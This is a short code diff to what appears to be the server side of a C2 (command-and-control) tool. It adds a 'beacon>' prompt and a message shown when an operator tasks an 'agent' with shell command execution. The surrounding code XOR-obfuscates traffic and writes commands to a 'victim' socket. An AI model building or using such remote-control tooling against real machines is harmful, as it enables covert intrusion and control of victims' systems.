@@ -104,8 +104,12 @@ void *Socket_Reader(){
     char* xorhello = XOR(buffer, key, n, keylen);
     write(STDOUT_FILENO, xorhello, n);
 
+    printf("beacon> ");
+
     fflush(NULL);
     while (a.kill == 0 && (n = read(a.dest, buffer, MAXBUF)) > 0) {
+
+	if(a.kill == 0){printf("beacon> ");}
 
 	xorbuffer = XOR(buffer, key, n, keylen);
 	if(str_starts_with(xorbuffer, "--HUNTER DOWNLOAD--") == 0){
@@ -179,8 +183,13 @@ void *Socket_Writer()
 	    free(xorbuffer);
 	    return NULL;
 	}
+
 	else {
 	
+	    if(str_starts_with(buffer, "shell") == 0){
+		printf("\n[+] Tasking agent with command execution\n\n");
+	    }
+
 	    char* xorbuffer = XOR(buffer, key, n, keylen);
 
             write(a.dest, xorbuffer, n); // writes to victim file descriptor. clientfd is passed to a.dest on line 12
@@ -237,7 +246,8 @@ void *Acceptor(){
             if ((activity < 0) && (errno!=EINTR)) {}
 
             if (FD_ISSET(master_socket, &readfds)) {
-                if ((new_socket = accept(master_socket, (struct sockaddr *)&cli, &len))<0){
+                
+		if ((new_socket = accept(master_socket, (struct sockaddr *)&cli, &len))<0){
                     perror("accept");
                     exit(EXIT_FAILURE);
                 }
